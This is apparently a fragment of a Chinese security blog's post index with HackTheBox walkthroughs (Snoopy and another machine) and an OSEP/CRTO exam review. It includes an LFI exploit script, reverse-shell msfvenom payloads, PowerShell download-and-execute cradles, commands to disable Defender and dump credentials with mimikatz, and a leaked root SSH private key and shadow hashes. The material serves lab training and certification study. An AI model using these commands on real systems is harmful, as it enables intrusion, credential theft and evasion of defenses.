redis-cli -s /var/run/redis/redis.sockzooperdoopercooper user flagcooper用户ssh登录，得到user flag： 12ssh cooper@10.10.11.213zooperdoopercooper 提权信息lincense看起来是给blog那边的用户生成pro license的： 并且这是一个python程序，可以直接查看代码，根据代码发现我们的用户名被拼接进去,并且后面接的{license.license}也算给格式化字符串提示了： 而用户名是从redis获取的，如果我们对其进行修改，那就可以利用Python的格式化字符串： Python format string vulnerabilities · Podaliriushttps://podalirius.net/en/articles/python-format-string-vulnerabilities/ 提权 &amp; root flag通过redis修改用户名,现在ssh连接就可以直接用交互式cli了 小坑，一个用户短时间内只能生成一次license，多次执行要等一会儿或者新建用户 12345678redis-cli -s /var/run/redis/redis.sockhset miao username &#123;license.__init__.__globals__&#125;sudo /usr/bin/license -p miao# 其中secret就是密码，输出很多unCR4ckaBL3Pa$$w0rdhset miao1 username &#123;license.__init__.__globals__[secret]&#125; root flag得到的密码就是root密码，直接切过去： 12su -unCR4ckaBL3Pa$$w0rd shadow12root:$y$j9T$tYoCSn&#x2F;hikACa4FLjkFxx&#x2F;$vg7mvtDQNyfOazsy&#x2F;RpEgxOzAzSktNbOiJWZkTr9ynD:19443:0:99999:7:::cooper:$y$j9T$ctbv4v7TD6ys.rBW.4sou&#x2F;$6..9q9HWLzKbpmqzL6R81pVJ.8IFdhDwqqnqlL425x&#x2F;:19300:0:99999:7::: 参考资料 Middleware everywhere and lots of misconfigurations to fix | Detectify Labshttps://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/ Python format string vulnerabilities · Podaliriushttps://podalirius.net/en/articles/python-format-string-vulnerabilities/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OSCE3 Review","slug":"OSCE3-Review","date":"2023-05-15T02:14:15.000Z","updated":"2023-05-15T02:17:58.689Z","comments":true,"path":"2023/05/15/OSCE3-Review/","link":"","permalink":"https://darkwing.moe/2023/05/15/OSCE3-Review/","excerpt":"","text":"沉迷王国之泪，懒得写了 直接看之前分散的吧： OSWE受験記 | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2022/02/07/OSWE%E5%8F%97%E9%A8%93%E8%A8%98/ OSED受験記 | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2022/10/07/OSED%E5%8F%97%E9%A8%93%E8%A8%98/ CRTO &amp; OSEP受験記 | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2023/05/12/CRTO-OSEP%E5%8F%97%E9%A8%93%E8%A8%98/","categories":[],"tags":[]},{"title":"CRTO & OSEP受験記","slug":"CRTO-OSEP受験記","date":"2023-05-12T05:15:25.000Z","updated":"2023-05-12T07:28:12.087Z","comments":true,"path":"2023/05/12/CRTO-OSEP受験記/","link":"","permalink":"https://darkwing.moe/2023/05/12/CRTO-OSEP%E5%8F%97%E9%A8%93%E8%A8%98/","excerpt":"","text":"简介 &amp; 区别 Red Team Opshttps://training.zeropointsecurity.co.uk/courses/red-team-ops PEN-300: Advanced Evasion Techniques and Breaching Defenses | OffSechttps://www.offsec.com/courses/pen-300/ 都是涉及AD的高级渗透，重合度很高，也存在一些区别 CRTO主要使用CS，而OSEP是禁止CS这类商业软件 CRTO的免杀直接用CS的arsenal-kit，OSEP的免杀要自己做 CRTO不讲原理，需要自己额外补充，OSEP讲的很细节 CRTO的考试环境和OSEP比起来小很多 CRTO一直在解释OPSEC，提供有ELK同步分析攻击行为产生的日志，OSEP不涉及这部分内容 CRTO的内容和OSEP相比多了ADCS，OSEP至今没更新这方面的内容 考试CRTOCRTO的考试是假定违规场景，从一个内鬼机器开始(所以这个机器是需要提权的)，4个自然日内48小时lab时间，没有监考，可以自己随时暂停，只要做好凭据收集权限维持这些，确保能随时继续就可以。通过标准是6/8，基本就是3个域8台机器，部分机器需要枚举提权。并且只需要简单记录提交flag即可，不需要写报告，考试结果在考试的4个自然日结束后自动出。 OSEPOSEP也是48小时考试，但是是连续的48小时，有监考并且考试结束后需要在24小时内提交报告。考试环境就是比CRTO更大更复杂(20台左右)。黑盒场景，只给两个外部入口，自己想办法打进内网，进行枚举以及横向。考试有两种通过方式，一种是拿到最终核心secret.txt,另一种是累积获取10个flag(总量高于10个)，local或者proof这种。攻击路径也是不止一条，一条路走不通换其他路径。 考试可以随意使用开源C2，但msf就够用了。 一个小坑，对于local.txt,Linux还好,就是直接翻用户目录。challenge里windows机器IIS，MSSQL这些拿到的local是在对应目录下，例如IIS的inetpub，但考试是在Public用户目录下的，所以注意别遗漏 考试准备考试环境就是Defender，提前准备好不同类型的免杀runner，例如： 直接上线的exe Applocker + CLM Bypass的exe amsi绕过 powershell shellcode runner office macro hta runner 另外准备好自己习惯的cheatsheet，我用的放后面commands了 toolsstatic的nmap，拿下入口机后通过入口机来探测内网，比通过代理稳很多 https://nmap.org/dist/nmap-7.92-win32.zip https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN 12345# powershell unzipExpand-Archive C:\\a.zip -DestinationPath C:\\a# linux tartar -xf nmap-7.91SVN-x86_64-portable.tar.gz 也有一些整理好的工具： Flangvik/SharpCollection: Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.https://github.com/Flangvik/SharpCollection Syslifters/offsec-tools: Compiled tools for internal assessmentshttps://github.com/Syslifters/offsec-tools 61106960/adPEAS: Powershell tool to automate Active Directory enumeration.https://github.com/61106960/adPEAS 参考资料blog Active Directory Security – Active Directory &amp; Enterprise Security, Methods to Secure Active Directory, Attack Methods &amp; Effective Defenses, PowerShell, Tech Notes, &amp; Geek Trivia…https://adsecurity.org/ Bypass-Evasion Techniques - Pentesting &amp; Red Teaming Noteshttps://notes.morph3.blog/windows/bypass-evasion-techniques I’m bringing relaying back: A comprehensive guide on relaying anno 2022 - TrustedSechttps://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/ Red vs. Blue: Kerberos Ticket Times, Checksums, and You! - TrustedSechttps://www.trustedsec.com/blog/red-vs-blue-kerberos-ticket-times-checksums-and-you/ Manipulating User Passwords Without Mimikatz - TrustedSechttps://www.trustedsec.com/blog/manipulating-user-passwords-without-mimikatz/ Meterpreter vs Modern EDR(s) - RedOps - Englishhttps://redops.at/en/blog/meterpreter-vs-modern-edrs-in-2023 Red teaming: Evading AV. Simple AV evasive malware | by Alex K | Apr, 2023 | InfoSec Write-upshttps://infosecwriteups.com/red-teaming-evading-av-c948ec5d10e9 Process injection in 2023, evading leading EDRs | Vincent Van Mieghemhttps://vanmieghem.io/process-injection-evading-edr-in-2023/ Forging Tickets in 2023 - 0xdeaddoodhttps://0xdeaddood.rocks/2023/05/11/forging-tickets-in-2023/ 系列GOAD环境加配套wp： Orange-Cyberdefense/GOAD: game of active directoryhttps://github.com/Orange-Cyberdefense/GOAD Mayflyhttps://mayfly277.github.io/ AV Evasion By Hop Infosec AV Evasion Part 1 · Hop Infosechttps://0xhop.github.io/evasion/2021/04/19/evasion-pt1/ AV Evasion Part 2, The disk is lava · Hop Infosechttps://0xhop.github.io/evasion/2021/05/26/evasion-pt2/ AV Evasion Part 3: Fibers · Hop Infosechttps://0xhop.github.io/evasion/2022/05/11/evasion-pt3/ Malware Dev By 0pr Malware Dev 00 - Rust vs C++ 初探_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129174832 Malware Dev 01 - 免杀之 PPID Spoofing 原理解析_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129268901 Malware Dev 02 - Windows SDDL 后门利用之 SCManager_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129198481 Malware Dev 03 - 隐匿之 Command Line Spoofing 原理解析_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129311065 Malware Dev 04 - 隐匿之 ETW（Event Tracing for Windows）Bypass_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129332463 Malware Dev 05 - 免杀之 Shellcode Execution Through Fiber_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129455384 Active Directory By 0pr Active Directory 01 - “史上最全”测试环境搭建模板_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/126593992 Active Directory 02 - Windows Kerberos Authentication（Kerberos 协议鉴权）_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/128976020 Active Directory 03 - Delegation（委派），MS-SFU 规范以及 Protocol Transition_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/128988699 Active Directory 04 - Bronze Bit Attack (CVE-2020-17049)_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129010881 Active Directory 05 - 初识 AD CS 证书服务_0pr的博客-CSDN博客https://blog.csdn.net/heisejiuhuche/article/details/129224570 域渗透GOAD(Game Of Active Directory) v2 域渗透GOAD(Game Of Active Directory) v2 （一） - 先知社区https://xz.aliyun.com/t/12137 域渗透GOAD(Game Of Active Directory) v2 （二） - 先知社区https://xz.aliyun.com/t/12138 域渗透GOAD(Game Of Active Directory) v2（三） - 先知社区https://xz.aliyun.com/t/12139 域渗透GOAD(Game Of Active Directory) v2（四） - 先知社区https://xz.aliyun.com/t/12140 codes chvancooten/OSEP-Code-Snippets: A repository with my notable code snippets for Offensive Security’s PEN-300 (OSEP) course. (这个很多代码可以直接拿来改改就用)https://github.com/chvancooten/OSEP-Code-Snippets mvelazc0/defcon27_csharp_workshop: Writing custom backdoor payloads with C# - Defcon 27 Workshophttps://github.com/mvelazc0/defcon27_csharp_workshop winsecurity/Offensive-C-Sharphttps://github.com/winsecurity/Offensive-C-Sharp DamonMohammadbagher/NativePayloads: All my Source Codes (Repos) for Red-Teaming &amp; Pentesting + Blue Teaminghttps://github.com/DamonMohammadbagher/NativePayloads api0cradle/UltimateAppLockerByPassList: The goal of this repository is to document the most common techniques to bypass AppLocker.https://github.com/api0cradle/UltimateAppLockerByPassList EvilEnigma/OSEP-Study: A repository of tools developed while studying for OSEP. The contents here are not part of courseware but some tools, i wrote as an extension to learning C# and offensive tooling.https://github.com/EvilEnigma/OSEP-Study CheatSheet S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference :: Cas van Cootenhttps://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/ RistBS/Awesome-RedTeam-Cheatsheet: Red Team Cheatsheet in constant expansion.https://github.com/RistBS/Awesome-RedTeam-Cheatsheet matthieu-hackwitharts/Win32_Offensive_Cheatsheet: Win32 and Kernel abusing techniques for pentestershttps://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet ChatGPT answers Cybersecurity Interview questionshttps://blog.killswitchx7.com/chatgpt-answers-cybersecurity-interview-questions Active directory pentesting: cheatsheet and beginner guidehttps://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide Integration-IT/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet reviews这个方向的就很多了，只放22和23年的： 2023 1.24 Offensive Security Experienced Penetration Tester (OSEP) Review - StefLan’s Security Bloghttps://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/ 2.5 OSEP PEN-300 review - Evasion and Breaching Techniqueshttps://www.alluresec.com/2023/02/05/osep-review/ 2022 5.17 PEN-300 and OSEP reviewhttps://niebardzo.github.io/2022-05-17-osep-review/ 6.26 OSEP Study guide 2022 | LinkedInhttps://www.linkedin.com/pulse/osep-study-guide-2022-jo%C3%A3o-paulo-de-andrade-filho/ 7.19 PEN-300 / OSEP review – Zolder B.V.https://zolder.io/pen-300-osep-review/ 7.30 OSEP PREPARATION. Article about — how to prepare for the… | by Karol Mazurek | Mediumhttps://karol-mazurek95.medium.com/osep-preparation-e4cad53b65f3 10.16 ノンペンテスターの OSEP 合格体験記 (2022/10) - 切られたしっぽhttps://migawari-iv.hatenablog.com/entry/2022/10/16/212215 10.24 PEN-300 &amp; OSEP Exam Review – alex-labs.comhttps://alex-labs.com/pen-300-osep-exam-review/ 中文 OSCE3之路 - OSEP | PEN300 - 4xpl0r3r’s bloghttps://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSEP-PEN300/ T00ls首发 OSEP考试的一点点心得 - 渗透测试文章(Security Articles) - T00ls | 低调求发展 - 潜心习安全https://www.t00ls.com/thread-62781-1-1.html OSEP REVIEW | Ikonw’s bloghttps://ik0nw.github.io/2022/04/12/osep_review/ commands经常用的一些命令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# 初始nmap扫描，记得加-Pn参数sudo nmap -A -Pn 192.168.xx.xx# DotNetToJScriptDotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js# msf handler# hander设置AutoRunScript，自动迁移到稳定进程set AutoRunScript \"migrate -n explorer.exe\"# 找不到explorer的情况下，尽快创建并迁移meterpreter &gt; execute -H -f notepadProcess 1196 created.meterpreter &gt; migrate 1196# Linux msfvenom，prependfork参数sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf# linux，fork类似windows的migrateset MeterpreterTryToFork true# 高级可选项# 自定义https证书set HandlerSSLCert /home/kali/self_cert/nasa.pem# stage 编码set EnableStageEncoding true set StageEncoder x64/zutto_dekiru or set StageEncoder x64/xor_dynamic# 检查防御措施# powershell CLM 检查$ExecutionContext.SessionState.LanguageMode# PPL检查Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"RunAsPPL\"# AppLocker检查Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe# powershell加载运行脚本(New-Object Net.WebClient).DownloadString('http://192.168.xx.xx/run.txt') | iex# 下载文件powershell -exec bypass -c \"iwr http://192.168.xx.xx/mimikatz_2.2.0.exe -outfile mimikatz.exe\"# powershell 反射加载运行 C# exe# 没有public$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.xx.xx/rev.exe')$asm = [System.Reflection.Assembly]::Load($data)# 无参数运行$asm.EntryPoint.Invoke($null,[Object[]]@(,[String[]]@()))# 带参数运行，处理$al = New-Object -TypeName System.Collections.ArrayList$al.Add(\"list_token bypass\".Split())$asm.EntryPoint.Invoke($null, $al.ToArray())# public static$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')$assem = [System.Reflection.Assembly]::Load($data)[rev.Program]::Main(\"\".Split())# Applocker 使用installutil绕过C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\Bypass.exe# 直接运行command，不进入powerhsell交互powershell -exec bypass -c \"command\"# 关闭defenderSet-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -Verbose# 添加白名单目录Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'# 删除所有规则C:\\\"Program Files\"\\\"Windows Defender\"\\MpCmdRun.exe -removedefinitions -all# 关闭防火墙NetSh Advfirewall set allprofiles state off# 允许远程桌面PTHpowershell -c \"New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name DisableRestrictedAdmin -value 0\"# xfreerdp pth,加额外参数xfreerdp /v:172.16.xx.xx /u:administrator /pth:xxxxxxxx # sshuttle打通隧道sshuttle -v -r root@192.168.xx.xx 172.16.xx.0/24# psexec启动system上下文PsExec64.exe -accepteula -s -i cmd.exe# MSSQLimpacket mssqlclient.py# 不是kali里自带的impacket-mssqlclient,版本太老缺少增强功能# mimikatz &amp; kiwi# lsa patch &amp; dumpmimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\"mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"mimikatz.exe \"token::elevate\" \"lsadump::secrets\" \"exit\"# meterpreter dumpmeterpreter &gt; hashdumpmeterpreter &gt; load kiwimeterpreter &gt; creds_allmeterpreter &gt; lsa_dump_sammeterpreter &gt; lsa_dump_secrets# wmic enum# windows获取运行中的进程命令行参数wmic process get caption,commandline /value","categories":[],"tags":[]},{"title":"Snoopy - HackTheBox","slug":"Snoopy-HackTheBox","date":"2023-05-09T01:35:02.000Z","updated":"2023-09-25T06:43:07.459Z","comments":true,"path":"2023/05/09/Snoopy-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Snoopy 10.10.11.212 端口扫描22，53，80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.212Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:06 CSTNmap scan report for 10.10.11.212Host is up (0.15s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)|_ 256 545941e1719a1a879c1e995059bfe5ba (ED25519)53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)| dns-nsid:|_ bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: SnoopySec Bootstrap Template - Index|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds 80链接里得到域名，加hosts： 110.10.11.212 snoopy.htb mailcontact里提到mail暂时离线： 子域名扫描子域名发现mm: 1234ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://snoopy.htb/\" -H 'Host: FUZZ.snoopy.htb' -fs 23418[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 200ms] * FUZZ: mm mm.snoopy.htb添加hosts后访问，是一个Mattermost： 但没开外部注册 LFI回到主站，存在一个下载功能，简单测试发现存在LFI，基础双写绕过，下载下来是一个压缩包，解压得到读取内容： 12345file_path=\"/etc/passwd\"curl \"http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//..../$file_path\" -o output.zipunzip output.zipcat press_package/$file_path 后面就是一步步读文件,例如前面端口和主站都有提到dns，就可以读dns配置文件： 1&#x2F;etc&#x2F;bind&#x2F;named.conf named.conf12345678910111213141516// This is the primary configuration file for the BIND DNS server named.//// Please read /usr/share/doc/bind9/README.Debian.gz for information on the// structure of BIND configuration files in Debian, *BEFORE* you customize// this configuration file.//// If you are just adding zones, please do that in /etc/bind/named.conf.localinclude \"/etc/bind/named.conf.options\";include \"/etc/bind/named.conf.local\";include \"/etc/bind/named.conf.default-zones\";key \"rndc-key\" &#123; algorithm hmac-sha256; secret \"BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=\";&#125;; lfi.py使用脚本完成自动解压，交互式读文件： 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom colorama import Fore, Styleimport zipfiledef lfi(path): try: #cookies url =\"http://snoopy.htb/download\" params = &#123;\"file\":f\"....//....//....//....//....//....//....//....//....//....//....//..../&#123;path&#125;\"&#125; r= requests.get(url,params=params) if(r.status_code == 200): with open('ejemplo.zip', 'wb') as f: f.write(r.content) with zipfile.ZipFile('ejemplo.zip', 'r') as zip_ref: zip_ref.extractall('.') with open(f'press_package&#123;path&#125;', 'r') as f: content = f.read() print(Fore.GREEN + f\"&#123;content&#125;\" + Style.RESET_ALL) else: print(Fore.RED + f\"&#123;path&#125; not found.\" + Style.RESET_ALL) except zipfile.BadZipFile: print(Fore.RED + f\"&#123;path&#125; not found.\" + Style.RESET_ALL) except Exception as e: print(Fore.RED + f\"LFI Error : &#123;e&#125;\" + Style.RESET_ALL)def main(): while True: path = input(Fore.BLUE + \"[+] file &gt;&gt; \" + Style.RESET_ALL) lfi(path)if __name__ == \"__main__\": main() DNS to mm前面知道mail离线，mm没开注册，找回密码提示发邮件应该是通过mail，那就尝试通过获得的secret添加dns记录： DNS Updates with nsupdate - Serverless Industrieshttps://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html 123456789# 本地开启smtp监听，用于后面接收邮件内容sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.13:25export HMAC=\"hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=\"nsupdate -y $HMACserver 10.10.11.212update add mail.snoopy.htb. 900 IN A 10.10.14.13send 然后去mm那里忘记密码发送找回邮件： 1234sbrown@snoopy.htb# 小坑，删除URL里的3D和=Reset Password http://mm.snoopy.htb/reset_password_complete?token=4f5x4ogxb7q1pgccrzh717kzkuyg9cq4ngt9z1xba4uuxze9tjo77spoyi5fzgya 重置成功，登录mm： mmmm里提供一些额外命令 server_provision看起来是操作服务器的： 输入参数测试，有连接过来,根据banner知道用的是Paramiko进行的ssh连接： ssh-mitm因为直接nc没法完成模拟完整的ssh交互，所以使用这个： SSH-MITM - ssh audits made simple — SSH-MITMhttps://docs.ssh-mitm.at/ 12345python3 -m pip install ssh-mitmcbrown@snoopy.htbpython3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222 remote设置成靶机ip，让mm那里连到我们的2222端口再转发到靶机的22端口，得到cbrown ssh账号密码： cbrowncbrown ssh登录,下一步应该是要通过git到sbrown： 1234Remote Address: 10.10.11.212:22Username: cbrownPassword: sn00pedcr3dential!!!Agent: no agent git apply这个命令是用来应用补丁的，可以通过补丁来修改文件，那就可以去修改sbrown的文件例如写一个公钥进去 1234567891011# 获取一个正常的diff格式，基于这个修改cd /homegit diff cbrown/.bash_history cbrown/.ssh/authorized_keys &gt; /tmp/diff# 修改其中的用户名为sbrown，添加公钥内容vim /tmp/diffchmod 777 /home/cbrown# 应用补丁，写入公钥sudo -u sbrown /usr/bin/git apply /tmp/diff /tmp/diff123456789101112131415diff --git a/cbrown/.bash_history b/cbrown/.bash_historydeleted file mode 120000index dc1dc0c..0000000--- a/cbrown/.bash_history+++ /dev/null@@ -1 +0,0 @@-/dev/null\\ No newline at end of filediff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keysnew file mode 100644index 0000000..e69de29--- /dev/null+++ b/sbrown/.ssh/authorized_keys@@ -0,0 +1 @@+ssh-rsa AAAAAAAAA user flag写入公钥到sbrown后ssh连接： 提权信息sudo运行clamscan,查看可用参数 测试发现-f指定文件列表扫描，会把文件内容打印出来，因为他把文件当成列表，去把每一行当成要扫描的文件名，从而产生错误输出： 提权 &amp; root flag那就直接去读ssh私钥了, 修复格式麻烦点： 123sudo /usr/local/bin/clamscan -f /root/.ssh/id_rsassh -i root_id_rsa root@10.10.11.212 shadow123root:$y$j9T$rU7hOwTnG6BpC3LHixl.d.$Bs2WEl7oZNFwYFWNGvW5WPrBf59XWJbulWaR.EVO1y4:19442:0:99999:7:::cbrown:$y$j9T$klyE893ZriSjZmbfTicAH&#x2F;$5P0yN9&#x2F;M5&#x2F;vPn8a.VSWukMywVwVV&#x2F;FS6hUYFDIM3DWC:19443:0:99999:7:::sbrown:$y$j9T$CpZTLLqOGPxaXw8KJm8Nv.$HOBA7HQe2Ie7WybP3cjf42VTgIcY6RwN0glhXfjG9k6:19435:0:99999:7::: root_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth&#x2F;iMUF6W2ogsW0KPFN8MffExz2G9D&#x2F;4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBfhy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSwkfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oICtqf16lLFi4Lm7t5jkhW9YzDRha7Om5wpxucUjQCG5dU&#x2F;Ij1BA5jE8G75PALrER&#x2F;4dIp2UzrXxs&#x2F;2Qqi&#x2F;4TPjFJZ5YyaforTB&#x2F;nmO3DJawo6bclAA762n9bdkvlxWd14vig54yP7SSXUtPGvP4VpjyL7NcPeO7Jrf62UVjlmdro5xaHnbuKFevyPHXmSQUE4yU3SdQ9lrepY&#x2F;eh4eNy0QJG7QUv8Z49qHnljwMTCcNeH6Dfc786jXguElzAAAFiAOsJ9IDrCfSAAAAB3NzaC1yc2EAAAGBANeetM1N4+5hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ&#x2F;+IKWIyHMmrjx0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4CE2tdADAQG579m0MloVWWkJUkORwx7dA8NZlgbnuXmsXrqlt0WCRoyo7hUsJH1rElay04eb39IGldapefVnPBoeyChaxBHC1y6qsg6KayqtmRtOktn6HlFpEmNd+FM&#x2F;aCAran9epSxYuC5u7eY5IVvWMw0YWuzpucKcbnFI0AhuXVPyI9QQOYxPBu+TwC6xEf+HSKdlM618bP9kKov+Ez4xSWeWMmn6K0wf55jtwyWsKOm3JQAO+tp&#x2F;W3ZL5cVndeL4oOeMj+0kl1LTxrz+FaY8i+zXD3juya3+tlFY5Zna6OcWh527ihXr8jx15kkFBOMlN0nUPZa3qWP3oeHjctECRu0FL&#x2F;GePah55Y8DEwnDXh+g33O&#x2F;Oo14LhJcwAAAAMBAAEAAAGABnmNlFyya4Ygk1v+4TBQ&#x2F;M8jhUflVY0lckfdkR0t6f0Whcxo14z&#x2F;IhqNbirhKLSOV3&#x2F;7jk6b3RB6a7ObpGSAz1zVJdob6tyEouU&#x2F;HWxR2SIQl9huLXJ&#x2F;OnMCJUvApuwdjuoH0KQsrioOMlDCxMyhmGq5pcO4GumC2K0cXxdX621o6B51VeuVfC4dN9wtbmucocVu1wUS9dWUI45WvCjMspmHjPCWQfSW8nYvsSkp17lnZvf5YiqlhX4pTPr6Y&#x2F;sLgGF04M&#x2F;mGpqskSdgpxypBhD7mFEkjH7zN&#x2F;dDoRp9ca4ISeTVvYYnUIbDETWaL+Isrm2blOY160Z8CSAMWj4z5giV5nLtIvAFoDbaoHvUzrnir57wxmq19Grt7ObZqpbBhX&#x2F;GzitstO8EUefG8MlC+CM8jAtAicAtY7WTikLRXGvU93Q&#x2F;cS0nRq0xFM1OEQqb6AQCBNT53rBUZSS&#x2F;cZwdpP2kuPPby0thpbncG13mMDNspG0ghNMKqJ+KnzTCxumBAAAAwEIF&#x2F;p2yZfhqXBZAJ9aUK&#x2F;TE7u9AmgUvvvrxNIvg57&#x2F;xwt9yhoEsWcEfMQEWwru7y8oH2eIAFpy9gH0J2Ue1QzAiJhhbl1uixf+2ogcs4&#x2F;F6n8SCSIcyXub14YryvyGrNOJ55trBelVLBMlbbmyjgavc6d6fn2ka6ukFin+OyWTh&#x2F;gyJ2LN5VJCsQ3M+qopfqDPE3pTr0MueaD4+chk5qNOTkGsn60KRGY8kjKhTrN3O9WSVGMGF171J9xvX6m7iDQAAAMEA&#x2F;c6AGETCQnB3AZpy2cHu6aN0sn6Vl+tqoUBWhOlOAr7O9UrczR1nN4vo0TMW&#x2F;VEmkhDgU56nHmzd0rKaugvTRlb9MNQg&#x2F;YZmrZBnHmUBCvbCzq&#x2F;4tj45MuHq2bUMIaUKpkRGY1cv1BH+06NV0irTSue&#x2F;r64U+WJyKyl4k+oqCPCAgl4rRQiLftKebRAgY7+uMhFCo63W5NRApcdO+s0m7lArpj2rVB1oLvdydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf49O15RLXne6qtCNxZpDjt3u7646&#x2F;aN32v7UVzGV7tw4k&#x2F;H8PyU819R9GcCR4wydLcB4bY4bNQ&#x2F;nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6eSN&#x2F;sjHa19HkZJeLcyGmU34&#x2F;ESyN6HqFLOXfyGjqTldwVVutrE&#x2F;Mvkm3ii&#x2F;0GqDkqW3PwgWatU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 参考资料 DNS Updates with nsupdate - Serverless Industrieshttps://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html Welcome to Paramiko! — Paramiko documentationhttps://www.paramiko.org/ SSH-MITM - ssh audits made simple — SSH-MITMhttps://docs.ssh-mitm.at/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"MonitorsTwo - 